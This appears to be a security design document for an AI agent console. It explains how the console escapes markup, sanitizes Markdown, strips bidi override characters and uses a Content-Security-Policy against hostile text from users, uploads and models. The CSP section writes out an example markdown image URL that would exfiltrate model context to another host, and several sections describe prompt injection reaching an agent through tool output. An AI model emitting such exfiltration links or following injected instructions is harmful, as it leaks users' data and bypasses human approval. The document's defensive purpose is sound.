# Where somebody else's words enter this page, and what is allowed through

The console renders text that a requester, an uploader and a model all had a hand in. Both
consoles this replaces carried the same discipline in comments — escape first, emit tags second.
React changes the mechanism. It must not change the rule, and this is the rule written down in
one place so it is arguable rather than folklore.

## The four things a hostile string can try

| | Stopped by | Held by |
|---|---|---|
| Become markup | React escapes text nodes; nothing calls `dangerouslySetInnerHTML` | `views/escaping.test.tsx` |
| Become markup *through the one path that emits tags* | `Markdown`'s allow-list schema | `components/schema.test.ts`, `Markdown.test.tsx` |
| Render as something other than what it is | `lib/text.ts` removes bidi overrides | `lib/text.test.tsx` |
| Run, or reach another origin, if the above failed | The Content-Security-Policy the server sends | `NothingTheModelWroteCanRunTest` (Java) |

## 1. Markup: there is no sink

React escapes every text node, so a string cannot become an element. The only ways past that
are `dangerouslySetInnerHTML` and writing `innerHTML`, and **neither appears anywhere in this
source tree** — `escaping.test.tsx` walks every `.ts`/`.tsx` file and fails if one does. The
payload that broke the ancestor console (#192, a ticket id that became an `onmouseover` handler)
is driven through every renderer, and nothing anywhere gains an `on*` attribute.

Two paths deliberately produce markup, and they are the whole list:

- **`Markdown`** — for text a tool or the model said it meant the formatting of. Sanitized on an
  allow-list: `href` is `http`/`https`/`mailto`, `src` is `http`/`https` (so no `data:` images),
  and `class` is only the highlighter's own names on `code` and `span`, so an answer cannot wear
  this console's styles and look like something the framework said.
  A raw HTML **block** — a line beginning with `<` — is turned into plain text before the
  sanitizer sees it (`lib/rawHtml.ts`). It used to render as *nothing*: `hast-util-sanitize`
  drops `raw` nodes, and a block is one raw node holding the tags and the sentence together, so
  the sentence went with them. Inline HTML was never affected, because it is three nodes and
  only the two tags are raw.
- **`Verbatim`** — for everything else, which is most things. A ticket description, a comment, an
  uploaded log line, a tool's raw output. Rendering those as markdown would be wrong twice over:
  wrong about what they are — a requester who typed `**URGENT**` typed it, and seeing that is
  part of working out what they filed — and it would hand whoever wrote them a formatting
  vocabulary inside this console.

The choice between the two is a decision somebody has to take, which is why `Verbatim` is a
named component rather than "don't call `Markdown`".

## 2. Reordering: the attack that survives escaping

Unicode's explicit bidirectional formatting characters reorder glyphs without changing the
string. `U+202E` makes `gpj.exe` render as `exe.jpg`. The text is inert and it still lies.

This is Trojan Source (CVE-2021-42574), it is a display attack rather than a parsing one, and
no amount of sanitizing markup touches it. `lib/text.ts` removes `U+202A`–`U+202E`,
`U+2066`–`U+2069`, `U+200E` and `U+200F` — and **only** those, not `\p{Cf}` wholesale, because
zero-width joiners are how emoji sequences and several Indic and Arabic scripts are written.

It matters most on the approval card. That card exists so a person can read a tool call before
it happens; a comment body that renders as something other than what it is defeats the point of
showing it to them.

## 3. The policy, for when one of the above has a hole

The server sends a Content-Security-Policy with every response (`ChatServer.harden`). The two
directives worth naming:

- **`script-src 'self'`** — no inline script, no CDN. A bug that got markup past the sanitizer
  still cannot get *code* past this.
- **`img-src 'self' data:`** — the quiet one. The markdown schema permits `http`/`https` image
  sources, so a model can emit `![](https://elsewhere/?q=…)` and the browser will fetch it. That
  request is an exfiltration channel out of the model's context needing no script and no
  injection, only a model that was persuaded. This closes it.

`style-src` allows `'unsafe-inline'`, and that is a real weakening rather than a shrug: React
sets a `style` attribute for the things that cannot be a class — a chart series' colour, a
numeric column's alignment. It is bounded by `img-src`, which is what makes a CSS-borne fetch to
another origin fail too. Script keeps no such allowance.

## 4. What does not come back the other way

A `View` goes one way. `ToolResult` carries a digest the model reads and views a person looks
at, and the split is what lets a tool return a hundred-row table without spending a hundred rows
of context. If any of it were folded back — summarised into the next turn, replayed on a resume
— the economy would be a lie *and* a payload could reach the model through a channel nobody is
fencing. `AViewIsNeverFedBackAsContextTest` drives a real agent with a hostile view and reads
every request that reached the client.

Server-side, everything a tool read stays fenced through `Spotlight`, and the trust floor
tightens once a run has taken in somebody else's words. That half is tested in
`agentkit-examples-workbench-chat`.

## What is not defended here

- **A persuaded model.** Nothing on this page, and nothing in `Spotlight`, promises a model will
  not follow an instruction it was shown. What the platform promises is that a persuaded model's
  write stops at a person — `AnInjectionThroughTheChatStillNeedsAPersonTest` drives a model that
  follows the injection *completely* and checks that it gets nowhere.
- **A hostile operator.** Somebody who can press Approve can approve things. That is the design.
- **The bytes of an uploaded file.** They are served as `application/octet-stream`, as a
  download, with `nosniff` and a `sandbox` policy — never rendered. Nothing here inspects them.
